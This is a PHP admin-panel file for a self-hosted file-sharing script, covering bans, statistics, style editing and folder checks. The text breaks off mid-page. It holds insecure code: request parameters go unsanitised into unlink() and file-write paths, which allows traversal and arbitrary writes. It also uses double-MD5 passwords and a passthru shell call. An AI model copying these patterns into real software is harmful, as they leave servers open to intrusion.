<?php
include("./config.php");
include("./lang/$language.php");

if(isset($_GET['act'])){$act = $_GET['act'];}else{$act = "null";}
session_start();
include("./header.php");
if($act=="login"){
  if (md5(md5($_POST['passwordx']))==$adminpass){
    $_SESSION['logged_in'] = md5(md5($adminpass));
  }
}
if($act=="logout"){
  session_unset();
  echo "";
}

if(isset($_SESSION['logged_in']) && $_SESSION['logged_in']==md5(md5($adminpass))) {

if(isset($_GET['download'])){
$filecrc = $_GET['download'];
$filecrctxt = $filecrc . ".mfh";
if (file_exists("./files/" . $filecrctxt)) {
	$fh = fopen("./files/" . $filecrctxt, r);
	$filedata= explode('|', fgets($fh));
}
echo "<script>window.location='".$scripturl."download2.php?a=".$filecrc."&b=".md5($filedata[1].$_SERVER['REMOTE_ADDR'])."';</script>";
fclose ($fh);
}

if(isset($_GET['delete'])) {

unlink("./files/".$_GET['delete'].".mfh");
unlink("./storage/".$_GET['delete']);

if(isset($_GET['banreport'])) {

$bannedfile = $_GET['banreport'];
if (file_exists("./files/$bannedfile".".mfh")) {
	unlink("./files/".$bannedfile.".mfh");
	unlink("./storage/".$bannedfile);
	$deleted=$bannedfile;
}
$fc=file("./secure/reports.mfh");
$f=fopen("./secure/reports.mfh","w+");
foreach($fc as $line)
{
  $thisline = explode('|', $line);
  if ($thisline[0] != $_GET['banreport'])
    fputs($f,$line);
}
fclose($f);
$f=fopen("./secure/bans.mfh","a+");
fputs($f,$deleted[3]."\n".$deleted[0]."\n");
unlink("./storage/".$_GET['banreport']);
}
}
if(isset($_GET['ignore'])) {

$fc=file("./secure/reports.mfh");
$f=fopen("./secure/reports.mfh","w+");
foreach($fc as $line)
{
  $thisline = explode('|', $line);
  if ($thisline[0] != $_GET['ignore'])
    fputs($f,$line);
}
fclose($f);
}

if(isset($_GET['act']) && $_GET['act']=="bans") {

if(isset($_GET['unban'])) {
$fc=file("./secure/bans.mfh");
$f=fopen("./secure/bans.mfh","w+");
foreach($fc as $line)
{
  if (md5($line) != $_GET['unban'])
    fputs($f,$line);
}
fclose($f);
}

if(isset($_POST['banthis'])) {
$f=fopen("./secure/bans.mfh","a+");
fputs($f,$_POST['banthis']."\n");
}


?>
<center><table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<? include("./adminmenu.php"); ?>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; Ban Management
</td></tr></table>
<br />
<center><form action="admin.php?act=bans" method="post"><? echo $lang[ban_text];?><br><br>
<input type="text" name="banthis" size=35>
<input type="submit" value="BAN!">
<br />
</form></center>
<?php

$fc=file("./secure/bans.mfh");
foreach($fc as $line)
{
  echo $line . " - <a href=\"admin.php?act=bans&unban=".md5($line)."\">unban</a><br />";
}
?>
</center></td></tr></table><p style="margin:3px;text-align:center">
<?
include("./adminfooter.php");
die();
}

if(isset($_GET['act']) && $_GET['act']=="changedlpass") {
?>
<center><table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<? include("./adminmenu.php"); ?>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; <? echo $lang[master];?>
</td></tr></table>
<br /><center>
<form action="admin.php?act=changedlpass" method="post">
  <p align=center><? echo $lang[set_master];?><br><br><center>
  <table border=0 cellspacing=3 cellpadding=0><tr><td align=left>
  <? echo $lang[set_master_1];?></td><td>
    <input type="text" name="changedlpass1" size=35></td></tr>
    <tr><td colspan=2 align=center><br />
    <input type="submit" value="<? echo $lang[set_master_now];?>">
    </td></tr></table>
  </div>
</form></center>
</center></td></tr></table><p style="margin:3px;text-align:center">
<?
$dirname = "./files";
$dh = opendir( $dirname ) or die("couldn't open directory");
while ( $file = readdir( $dh ) ) {
if ($file != '.' && $file != '..' && $file != ".htaccess") {
  $fh=fopen("./files/" . $file ,'r');
  $filedata= explode('|', fgets($fh));
  if ($filedata[7])
  {
  $filelist = fopen("./files/$filedata[0].mfh","w");
fwrite($filelist, $filedata[0]."|".$filedata[1]."|".$filedata[2]."|".$filedata[3]."|".$filedata[4]."|".$filedata[5]."|".$filedata[6]."|".md5($_POST['changedlpass1'])."|".$filedata[8]."|");
  }
  fclose($fh);
}
}
closedir( $dh );
?>
</center></td></tr></table><p style="margin:3px;text-align:center">
<?
include ("./adminfooter.php");
die();
}
if(isset($_GET['act']) && $_GET['act']=="info") {
?>
<center>
<table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<? include("./adminmenu.php"); ?>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; <? echo $lang[info_11];?>
</td></tr></table>
<br />
<center>

<?php
$arr = array(
    array('FTP-Server', 21),
    array('SSH-Server', 22),
    array('SMTP Mail-Server', 25),
    array('DNS-Server', 53),
    array('HTTP Web-Server', 80),
    array('POP3 Mail-Server', 110),
    array('HTTPS Web-Server', 443),
    array('MySQL-Server', 3306)
);

function getStat($_statPath)
{
    if (trim($_statPath) == '') {
        $_statPath = '/proc/stat';
    }

    ob_start();
    passthru('cat '.$_statPath);
    $stat = ob_get_contents();
    ob_end_clean();


    if (substr($stat, 0, 3) == 'cpu') {
        $parts = explode(" ", preg_replace("!cpu +!", "", $stat));
    } else {
        return false;
    }

    $return = array();
    $return['user'] = $parts[0];
    $return['nice'] = $parts[1];
    $return['system'] = $parts[2];
    $return['idle'] = $parts[3];
    return $return;
}

function getCpuUsage($_statPath = '/proc/stat') {
    $time1 = getStat($_statPath) or die("getCpuUsage(): couldn't access STAT path or STAT file invalid\n");
    sleep(1);
    $time2 = getStat($_statPath) or die("getCpuUsage(): couldn't access STAT path or STAT file invalid\n");

    $delta = array();

    foreach ($time1 as $k=>$v) {
        $delta[$k] = $time2[$k] - $v;
    }

    $deltaTotal = array_sum($delta);
    $percentages = array();

    foreach ($delta as $k=>$v) {
        $percentages[$k] = round($v / $deltaTotal * 100, 2);
    }
    return $percentages;
}
?>
<center><table width=350 border=0 cellspacing=1 cellpadding=3 bgcolor=#C0C0C0>
<tr>
<th colspan=3 bgcolor=#C0C0C0 background="img/button03.gif"><font color=#000000>Server: <? echo $_SERVER['SERVER_NAME'] ?></th>
</tr>
<tr>
<td bgcolor=#C0C0C0 background="img/button03.gif" align=center><b><? echo $lang[sd];?></td>
<td bgcolor=#C0C0C0 background="img/button03.gif" align=center><b>Status</td>
<td bgcolor=#C0C0C0 background="img/button03.gif" align=center><b>Port</td>
</tr>
<?php
foreach($arr as $c) {
    if(@fsockopen($_SERVER['SERVER_NAME'], $c[1], $errno, $errstr, 5))  {
        $img = "img/up.png";
    } else {
        $img = "img/down.png";
    }

    echo '<tr>
        <td bgcolor="#EAEAEA" align="left">'.$c[0].'</td>
        <td align="center" bgcolor="#FFFFFF"><img src="'. $img .'" border="0" width="14" height="14" alt="" /></td>
        <td bgcolor="#EAEAEA" align="center">'.$c[1].'</td>
    </tr>';
    flush();
}
echo "</table><br>";

$cpu = getCpuUsage();
$cpulast = 100-$cpu['idle'];
echo '<center><table width=350 border=0 cellspacing=1 cellpadding=3 bgcolor=#C0C0C0>';
echo "<tr><th colspan=3 bgcolor=#000000 background=\"img/button03.gif\">";
echo "<font color=#000000>". $lang[cpu] . $_SERVER['SERVER_NAME']."</th></tr>";
echo '<tr><td colspan=3 align=center bgcolor="#EAEAEA"><center><img src="ratingbar.php?rating='.$cpulast.'" border="0"></td></tr>';
echo "<tr><td bgcolor=#EAEAEA>". $lang[ap] ."</td><td colspan=2 align=center bgcolor=#EAEAEA>" . $cpulast . "%</td></tr>";
echo '</table><br>';
echo $lang[la].": ".date("d.m.Y - H:i",filemtime(basename($_SERVER["PHP_SELF"])));
?>

<?
echo "</center></td></tr></table><p style=\"margin:3px;text-align:center\">";
include ("./adminfooter.php");
die();
 }

if(isset($_GET['act']) && $_GET['act']=="stats") {
?>
<center>
<table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<? include("./adminmenu.php"); ?>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; <? echo $lang[stats];?>
</td></tr></table>
<br />
<table width=100% border=0 cellspacing=0 cellpadding=0><tr><td valign=top align=left>
<b><? echo $lang[visitor];?></b><br>
<? include("counter/counter.php"); ?>
</td><td valign=top align=right>
<table width=100% border=0 cellspacing=0 cellpadding=3><tr><td align=right>


<?php
//////////// Sortierung ///////////
if(isset($_GET['act'])){$act = $_GET['act'];}else{$act = "null";}

$order = array();
$dirname = "./files";
$dh = opendir( $dirname ) or die("couldn't open directory");
while ( $file = readdir( $dh ) ) {
if ($file != '.' && $file != '..' && $file != '.htaccess') {
	$fh = fopen ("./files/".$file, r);
	$list= explode('|', fgets($fh));
	$filecrc = str_replace(".mfh","",$file);
	if (isset($_GET['sortby'])) {
		$order[] = $list[1].','.$filecrc.','.$list[5].",".$list[4];
	} else {
	    $order[] = $list[5].','.$filecrc.','.$list[1].",".$list[4];
	}
	fclose ($fh);
}
}

if (isset($_GET['sortby'])) {
	sort($order, SORT_STRING);
} else {
	sort($order, SORT_NUMERIC);
	$order = array_reverse($order);
}
//////////// Dateiliste ///////////
$i = 1;
$dirname = "./files";
$dh = opendir( $dirname ) or die("couldn't open directory");
while ( $file = readdir( $dh ) ) {
if ($file != '.' && $file != '..' && $file != '.htaccess') {
  $filecrc = str_replace(".mfh","",$file);
  $filesize = filesize("./storage/". $filecrc);
  $filesize = ($filesize / 1048576);
  $fh = fopen ("./files/".$file, r);
  $filedata= explode('|', fgets($fh));
  $tsize = $tsize + round($filesize,2);
  $tbandwidth = $tbandwidth + round($filesize*$filedata[5],2);
  $tdownload = $tdownload + round($filedata[5],2);
  $xzal=$i++;
  fclose ($fh);

}

}
  echo "<center><table width=310 border=0 cellspacing=1 cellpadding=3 bgcolor=#C0C0C0>";
  echo "<tr><td bgcolor=#F4F4F4>".$lang[total_files]."</td><td bgcolor=#F4F4F4>".$xzal."</td></tr>";
  echo "<tr><td bgcolor=#F4F4F4>".$lang[total_filesize]."</td><td bgcolor=#F4F4F4>".$tsize." MB</td></tr>";
  echo "<tr><td bgcolor=#F4F4F4>".$lang[total_downloads]."</td><td bgcolor=#F4F4F4>".$tdownload."</td></tr>";
  echo "<tr><td bgcolor=#F4F4F4>".$lang[total_bandwith]."</td><td bgcolor=#F4F4F4>".$tbandwidth." MB</td></tr>";
  echo "</td></tr></table></center>";
?>

<?
function ZahlenFormatieren($Wert)
{
    if($Wert > 1099511627776)
    {
        $Wert = number_format($Wert/1099511627776, 2, ",", ".")." TB";
    }
    elseif($Wert > 1073741824)
    {
        $Wert = number_format($Wert/1073741824, 2, ",", ".")." GB";
    }
    elseif($Wert > 1048576)
    {
        $Wert = number_format($Wert/1048576, 2, ",", ".")." MB";
    }
    elseif($Wert > 1024)
    {
        $Wert = number_format($Wert/1024, 2, ",", ".")." kB";
    }
    else
    {
        $Wert = number_format($Wert, 2, ",", ".")." Bytes";
    }

    return $Wert;
}

$frei = disk_free_space("./");
$insgesamt = disk_total_space("./");
$belegt = $insgesamt-$frei;
$prozent_belegt = 100*$belegt/$insgesamt;
?>
</td><td align=right>
<table width=310 border=0 cellspacing=1 cellpadding=3 bgcolor=#C0C0C0>
<tr><td bgcolor=#F4F4F4><? echo $lang[diskspace];?></td><td bgcolor=#F4F4F4><?=ZahlenFormatieren($insgesamt);?></td></tr>
<tr><td bgcolor=#F4F4F4><? echo $lang[in_use];?></td><td bgcolor=#F4F4F4><?=ZahlenFormatieren($belegt);?>    (<?=round($prozent_belegt,"2");?> %)</td></tr>
<tr><td colspan=2 bgcolor=#F4F4F4 align=center><center><img src="ratingbar.php?rating=<?=round($prozent_belegt,"2");?>" border="0"></td></tr>
<tr><td bgcolor=#F4F4F4><? echo $lang[free];?></td><td bgcolor=#F4F4F4><?=ZahlenFormatieren($frei);?>
</td></tr></table>
</td></tr></table>
</td></tr></table>
<br />
<table width=100% border=0 cellspacing=0 cellpadding=2>
<tr><td valign=top width=405>
<b><? echo $lang[adminlogs];?></b><br>
<textarea name="textarea" style="width:400px; font-family : Verdana, Arial; color : #000000; font-size:11px;" rows="11" wrap="physical" readonly><? include ("./secure/logs.mfh") ?></textarea><br />
<form method="post" action="admin.php?act=statsdel">
<input type="submit" name="delete" value="<? echo $lang[deleteadminlogs];?>">
</form>
</td><td align=top valign=left>
<b><? echo $lang[topten];?>:</b><br />
<table width="100%" cellpadding="0" cellspacing="0" border="0">
<?php
$me=$shourturl;
if ($me=="true")
  $short= "";
else
  $short= "download.php?file=";

$order = array();
$dirname = "./files";
$dh = opendir( $dirname ) or die("couldn't open directory");
while ( $file = readdir( $dh ) ) {
if ($file != '.' && $file != '..' && $file != '.htaccess') {
	$fh = fopen ("./files/".$file, r);
	$list= explode('|', fgets($fh));
	$filecrc = str_replace(".mfh","",$file);
	if (isset($_GET['sortby'])) {
		$order[] = $list[1].','.$filecrc.','.$list[5].",".$list[4];
	} else {
	    $order[] = $list[5].','.$filecrc.','.$list[1].",".$list[4];
	}
	fclose ($fh);
}
}

if (isset($_GET['sortby'])) {
	sort($order, SORT_STRING);
} else {
	sort($order, SORT_NUMERIC);
	$order = array_reverse($order);
}

$i = 1;

foreach($order as $line)
{
  $line = explode(',', $line);

$shourturl==$me;
if ($me=="true")
  $short= "";
else
  $short= "download.php?file=";

  if (isset($_GET['sortby'])) {
  	echo "<tr><td bgcolor=#F7F7F7 align=center>".$i."</td><td bgcolor=#F7F7F7 align=left><a href=\"". $short .$filedata[0] ."\" target=\"_blank\">".$line[0]."</a></td><td bgcolor=#F7F7F7 align=center>".$line[2]."</td>";
  } else {
  	echo "<tr><td bgcolor=#F7F7F7 align=center>".$i."</td><td bgcolor=#F7F7F7 align=left><a href=\"". $short .$filedata[0] ."\" target=\"_blank\">".$line[2]."</a></td><td bgcolor=#F7F7F7 align=center>".$line[0]."</td>";
  }

if($i == 10) break;
$i++;

}
?>

</td></tr></table>
</td></tr></table>

<?
echo "</center></td></tr></table><p style=\"margin:3px;text-align:center\">";
include ("./adminfooter.php");
die();
 }
 if(isset($_GET['act']) && $_GET['act']=="statsdel") {
?>
<center>
<table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<? include("./adminmenu.php"); ?>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; Statistics
</td></tr></table>
<br />
<table width=100% border=1 cellspacing=0 cellpadding=0><tr><td valign=top>
<b><? echo $lang[visitor];?></b><br>
<? include("counter/counter.php"); ?>
</td><td valign=top>
<table width=100% border=0 cellspacing=0 cellpadding=3><tr><td align=right>


<?php
//////////// Sortierung ///////////
if(isset($_GET['act'])){$act = $_GET['act'];}else{$act = "null";}

$order = array();
$dirname = "./files";
$dh = opendir( $dirname ) or die("couldn't open directory");
while ( $file = readdir( $dh ) ) {
if ($file != '.' && $file != '..' && $file != '.htaccess') {
	$fh = fopen ("./files/".$file, r);
	$list= explode('|', fgets($fh));
	$filecrc = str_replace(".mfh","",$file);
	if (isset($_GET['sortby'])) {
		$order[] = $list[1].','.$filecrc.','.$list[5].",".$list[4];
	} else {
	    $order[] = $list[5].','.$filecrc.','.$list[1].",".$list[4];
	}
	fclose ($fh);
}
}

if (isset($_GET['sortby'])) {
	sort($order, SORT_STRING);
} else {
	sort($order, SORT_NUMERIC);
	$order = array_reverse($order);
}
//////////// Dateiliste ///////////
$i = 1;
$dirname = "./files";
$dh = opendir( $dirname ) or die("couldn't open directory");
while ( $file = readdir( $dh ) ) {
if ($file != '.' && $file != '..' && $file != '.htaccess') {
  $filecrc = str_replace(".mfh","",$file);
  $filesize = filesize("./storage/". $filecrc);
  $filesize = ($filesize / 1048576);
  $fh = fopen ("./files/".$file, r);
  $filedata= explode('|', fgets($fh));
  $tsize = $tsize + round($filesize,2);
  $tbandwidth = $tbandwidth + round($filesize*$filedata[5],2);
  $tdownload = $tdownload + round($filedata[5],2);
  $xzal=$i++;
  fclose ($fh);

}

}
  echo "<table width=340 border=0 cellspacing=1 cellpadding=3 bgcolor=#C0C0C0>";
  echo "<tr><td bgcolor=#F4F4F4 align=right>".$lang[total_files]."</td><td bgcolor=#F4F4F4 align=right>".$xzal."</td></tr>";
  echo "<tr><td bgcolor=#F4F4F4 align=right>".$lang[total_filesize]."</td><td bgcolor=#F4F4F4 align=right>".$tsize." MB</td></tr>";
  echo "<tr><td bgcolor=#F4F4F4 align=right>".$lang[total_downloads]."</td><td bgcolor=#F4F4F4 align=right>".$tdownload."</td></tr>";
  echo "<tr><td bgcolor=#F4F4F4 align=right>".$lang[total_bandwith]."</td><td bgcolor=#F4F4F4 align=right>".$tbandwidth." MB</td></tr>";
  echo "</td></tr></table>";
?>

<?
function ZahlenFormatieren($Wert)
{
    if($Wert > 1099511627776)
    {
        $Wert = number_format($Wert/1099511627776, 2, ",", ".")." TB";
    }
    elseif($Wert > 1073741824)
    {
        $Wert = number_format($Wert/1073741824, 2, ",", ".")." GB";
    }
    elseif($Wert > 1048576)
    {
        $Wert = number_format($Wert/1048576, 2, ",", ".")." MB";
    }
    elseif($Wert > 1024)
    {
        $Wert = number_format($Wert/1024, 2, ",", ".")." kB";
    }
    else
    {
        $Wert = number_format($Wert, 2, ",", ".")." Bytes";
    }

    return $Wert;
}

$frei = disk_free_space("./");
$insgesamt = disk_total_space("./");
$belegt = $insgesamt-$frei;
$prozent_belegt = 100*$belegt/$insgesamt;
?>
</td><td>
<table width=340 border=0 cellspacing=1 cellpadding=3 bgcolor=#C0C0C0>
<tr><td bgcolor=#F4F4F4><? echo $lang[diskspace];?></td><td bgcolor=#F4F4F4><?=ZahlenFormatieren($insgesamt);?></td></tr>
<tr><td bgcolor=#F4F4F4><? echo $lang[in_use];?></td><td bgcolor=#F4F4F4><?=ZahlenFormatieren($belegt);?>    (<?=round($prozent_belegt,"2");?> %)</td></tr>
<tr><td colspan=2 bgcolor=#F4F4F4 align=center><center><img src="ratingbar.php?rating=<?=round($prozent_belegt,"2");?>" border="0"></td></tr>
<tr><td bgcolor=#F4F4F4><? echo $lang[free];?></td><td bgcolor=#F4F4F4><?=ZahlenFormatieren($frei);?>
</td></tr></table>
</td></tr></table>
</td></tr></table>
<br />
<table width=100% border=0 cellspacing=0 cellpadding=2>
<tr><td valign=top width=405>
<b><? echo $lang[adminlogs];?></b><br>
<textarea name="textarea" style="width:400px; font-family : Verdana, Arial; color : #000000; font-size:11px;" rows="11" wrap="physical" readonly><? include ("./secure/logs.mfh") ?></textarea><br />
<form method="post" action="">
<input type="submit" value="Delete Admin Logs">

<?php
$dat=""; // Variable die den neuen Inhalt enthält

$open=fopen("secure/logs.mfh",'w'); // Dateihandle. Modus w für überschreiben
fwrite($open,$dat); // Neuen Inhalt schreiben
fclose($open); // Handle zur Datei schließen
  echo '<font color=#008000>'."\n";
  echo 'Logfile erfolgreich gelöscht!'."\n";
  echo '<META HTTP-EQUIV="Refresh" CONTENT="1; URL=admin.php?act=stats">';
  echo '</font><br />'."\n";
?>
</form>
</td><td align=top valign=left>
<b><? echo $lang[topten];?>:</b><br />

<table width="100%" cellpadding="0" cellspacing="0" border="0">

<?php
$me=$shourturl;
if ($me=="true")
  $short= "";
else
  $short= "download.php?file=";

$order = array();
$dirname = "./files";
$dh = opendir( $dirname ) or die("couldn't open directory");
while ( $file = readdir( $dh ) ) {
if ($file != '.' && $file != '..' && $file != '.htaccess') {
	$fh = fopen ("./files/".$file, r);
	$list= explode('|', fgets($fh));
	$filecrc = str_replace(".mfh","",$file);
	if (isset($_GET['sortby'])) {
		$order[] = $list[1].','.$filecrc.','.$list[5].",".$list[4];
	} else {
	    $order[] = $list[5].','.$filecrc.','.$list[1].",".$list[4];
	}
	fclose ($fh);
}
}

if (isset($_GET['sortby'])) {
	sort($order, SORT_STRING);
} else {
	sort($order, SORT_NUMERIC);
	$order = array_reverse($order);
}

$i = 1;

foreach($order as $line)
{
  $line = explode(',', $line);

$shourturl==$me;
if ($me=="true")
  $short= "";
else
  $short= "download.php?file=";

  if (isset($_GET['sortby'])) {
  	echo "<tr><td bgcolor=#F7F7F7 align=center>".$i."</td><td bgcolor=#F7F7F7 align=left><a href=\"". $short .$filedata[0] ."\" target=\"_blank\">".$line[0]."</a></td><td bgcolor=#F7F7F7 align=center>".$line[2]."</td>";
  } else {
  	echo "<tr><td bgcolor=#F7F7F7 align=center>".$i."</td><td bgcolor=#F7F7F7 align=left><a href=\"". $short .$filedata[0] ."\" target=\"_blank\">".$line[2]."</a></td><td bgcolor=#F7F7F7 align=center>".$line[0]."</td>";
  }

if($i == 10) break;
$i++;

}
?>

</td></tr></table>
</td></tr></table>

<?
echo "</center></td></tr></table><p style=\"margin:3px;text-align:center\">";
include ("./adminfooter.php");
die();
 }

if(isset($_GET['act']) && $_GET['act']=="edit") {
?>
<center>
<table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<? include("./adminmenu.php"); ?>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; Edit Styles
</td></tr></table>
<br />

<?php
echo '<form action="admin.php?act=edit" method="POST">';
// Zuerst den Ordner auswählen
$ordner = "./css/";
$folder = opendir( $ordner );
// Dann das ganze in eine Select-Box packen
echo 'Available Styles:&nbsp;<select name="style" id="template">';
while ( ( $entry = readdir( $folder ) ) !== FALSE )
{
  if ( $entry != "." && $entry != ".." )
  {
// Und hier nur Dateien mit einer bestimmten Endung auswählen
    if (substr($entry,-4,4)=='.css')
    {
      $filename = basename( $entry, '.css' );
      echo '<option value="'.$filename.'.css">'.$filename.'.css</option>';
    }
  }
}
echo '</select>';
echo '&nbsp;<input type="submit" name="auswahl" value="Edit"></input>';
echo '</form>';

$datei = $_POST["style"];
$edit = $ordner.$datei;

if(isset($_POST["dateiinhalt"]) && $dateiinhalt = $_POST["dateiinhalt"])
{
  $handle = fopen($edit,"w");
  fwrite($handle, preg_replace("/\r\n|\r/", "\n", $dateiinhalt));
  fclose($handle);
  echo '<font color=#008000>'."\n";
  echo 'File saved successfully!'."\n";
  echo '<META HTTP-EQUIV="Refresh" CONTENT="1; URL=admin.php?act=edit">';
  echo '</font><br />'."\n";
}
if($datei)
$fileinhalt = file_get_contents($edit);
else
$fileinhalt = '';

?>
<form action="admin.php?act=edit" method="post">
<textarea style="width:99%; font-family : Verdana, Arial; color : #000000; font-size:11px;" rows="20" wrap="physical" name="dateiinhalt"><?php
echo $fileinhalt;
?></textarea><br>
<input type="submit" name="submit" value="Save Changes">
<input type="reset" name="reset" value="Discard Changes">
<input type="hidden" name="style" value="<?=$datei;?>">
</form>

<?
echo "</center></td></tr></table><p style=\"margin:3px;text-align:center\">";
include ("./adminfooter.php");
die();
 }

if(isset($_GET['act']) && $_GET['act']=="check") {
?>
<center>
<table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<? include("./adminmenu.php"); ?>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; <? echo $lang[check_1];?>
</td></tr></table>
<center>
<font face=verdana size=1>
<? echo $lang[check_2];?><br />
<table border=0 cellspacing=1 cellpadding=2 bgcolor=#C0C0C0>
<tr><td colspan=3 bgcolor=#C0C0C0 background="img/button03.gif" align=center>
<b><? echo $lang[folder];?></td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
./files</td><td bgcolor=#F2F2F2>
<?
$ziel="./files";  // oder "/tmp" oder  "." etc.
$ordner=realpath($ziel);
if ($ordner===false)
    {
    echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldern];
    } else
    {
    if (is_writeable($ordner))
        {
        echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[foldere];
        } else
        {
        echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldernw];
        }
    }
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
./storage</td><td bgcolor=#F2F2F2>
<?
$ziel="./storage";  // oder "/tmp" oder  "." etc.
$ordner=realpath($ziel);
if ($ordner===false)
    {
    echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldern];
    } else
    {
    if (is_writeable($ordner))
        {
        echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[foldere];
        } else
        {
        echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldernw];
        }
    }
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
./dl</td><td bgcolor=#F2F2F2>
<?
$ziel="./dl";  // oder "/tmp" oder  "." etc.
$ordner=realpath($ziel);
if ($ordner===false)
    {
    echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldern];
    } else
    {
    if (is_writeable($ordner))
        {
        echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[foldere];
        } else
        {
        echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldernw];
        }
    }
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
./secure</td><td bgcolor=#F2F2F2>
<?
$ziel="./secure";  // oder "/tmp" oder  "." etc.
$ordner=realpath($ziel);
if ($ordner===false)
    {
    echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldern];
    } else
    {
    if (is_writeable($ordner))
        {
        echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[foldere];
        } else
        {
        echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldernw];
        }
    }
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
./downloader</td><td bgcolor=#F2F2F2>
<?
$ziel="./downloader";  // oder "/tmp" oder  "." etc.
$ordner=realpath($ziel);
if ($ordner===false)
    {
    echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldern];
    } else
    {
    if (is_writeable($ordner))
        {
        echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[foldere];
        } else
        {
        echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldernw];
        }
    }
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
./uploader</td><td bgcolor=#F2F2F2>
<?
$ziel="./uploader";  // oder "/tmp" oder  "." etc.
$ordner=realpath($ziel);
if ($ordner===false)
    {
    echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldern];
    } else
    {
    if (is_writeable($ordner))
        {
        echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[foldere];
        } else
        {
        echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldernw];
        }
    }
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
./temp</td><td bgcolor=#F2F2F2>
<?
$ziel="./temp";  // oder "/tmp" oder  "." etc.
$ordner=realpath($ziel);
if ($ordner===false)
    {
    echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldern];
    } else
    {
    if (is_writeable($ordner))
        {
        echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[foldere];
        } else
        {
        echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldernw];
        }
    }
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
./css</td><td bgcolor=#F2F2F2>
<?
$ziel="./css";  // oder "/tmp" oder  "." etc.
$ordner=realpath($ziel);
if ($ordner===false)
    {
    echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldern];
    } else
    {
    if (is_writeable($ordner))
        {
        echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[foldere];
        } else
        {
        echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[foldernw];
        }
    }
?>
</td></tr>
<tr><td colspan=3 bgcolor=#C0C0C0 background="img/button03.gif" align=center>
<b><? echo $lang[textfiles];?></td></tr>

<tr><td bgcolor=#F2F2F2 align=left>
bans.mfh
</td><td bgcolor=#F2F2F2>
<?php
$datei = "secure/bans.mfh";
if (!is_writeable($datei)) {
echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[few];
}
else {
echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[fe];
}
?>
</td></tr>
